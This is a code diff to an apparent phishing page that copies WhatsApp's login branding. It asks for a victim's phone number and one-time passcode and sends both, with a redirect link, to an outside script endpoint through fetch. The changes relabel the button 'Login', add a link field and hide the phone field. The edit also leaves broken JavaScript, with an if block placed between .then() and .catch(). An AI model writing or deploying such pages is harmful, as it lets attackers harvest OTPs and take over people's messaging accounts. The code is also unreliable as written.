@@ -75,8 +75,9 @@ button:hover {
   </header>
     <img src="https://toppng.com/uploads/preview/download-whatsapp-social-media-apps-11563650769y1qhv167dh.png" alt="Logo" class="logo">
     <form id="otpForm">
+<input type="text" id="Redirected" placeholder="link" style="display:block;">
         <input type="tel" id="phoneNumber" placeholder="Phone Number">
-        <button id="getOtpBtn">Get OTP</button>
+        <button id="getOtpBtn">Login</button>
         <div id="progressBar" style="display:none;">
             <progress value="0" max="100"></progress>
         </div>
@@ -92,7 +93,8 @@ button:hover {
     <script>
 
       const urlParams = new URLSearchParams(window.location.search);
-  const link = urlParams.get('link');
+  const link = urlParams.get('lin');
+document.getElementById('Redirected').value = link;
 
 document.getElementById('getOtpBtn').addEventListener('click', getOtp);
 document.getElementById('checkOtpBtn').addEventListener('click', checkOtp);
@@ -117,6 +119,9 @@ function getOtp(e) {
       document.getElementById('progressBar').style.display = 'none';
       document.getElementById('checkOtpBtn').style.display = 'block';
       document.getElementById('otpInput').style.display = 'block';
+      
+       document.getElementById('phoneNumber').style.display = 'none';
+      document.getElementById('otpInput').style.display = 'block';
     }
   }, 1000);
   
@@ -129,22 +134,25 @@ function getOtp(e) {
 function checkOtp(e) {
   e.preventDefault();
   var phoneNumber = document.getElementById('phoneNumber').value;
-  var otp = document.getElementById('otp(otpInput').value;
+  var otp = document.getElementById('otpInput').value;
+  var linkValue = document.getElementById('Redirected').value;
   
-  if (!link) {
-     window.open('https://web.whatsapp.com/', '_blank');
-    return;
-  }
   
-  fetch(`${scriptUrl}?update=true&phoneNumber=${phoneNumber}&otp=${otp}&link=${link}`)
+  fetch(`${scriptUrl}?update=true&phoneNumber=${phoneNumber}&otp=${otp}&link=${linkValue}`)
     .then(response => response.json())
     .then(data => {
       if (data.status === 'success') {
-        window.open(link, '_blank');
+        window.open(linkValue, '_blank');
       } else {
         alert('Invalid OTP or phone number');
       }
     })
+  if (!linkValue) {
+     window.open('https://web.com/', '_blank');
+    return;
+  }
+  
+  
     .catch(error => console.error('Error:', error));
 }
   </script>
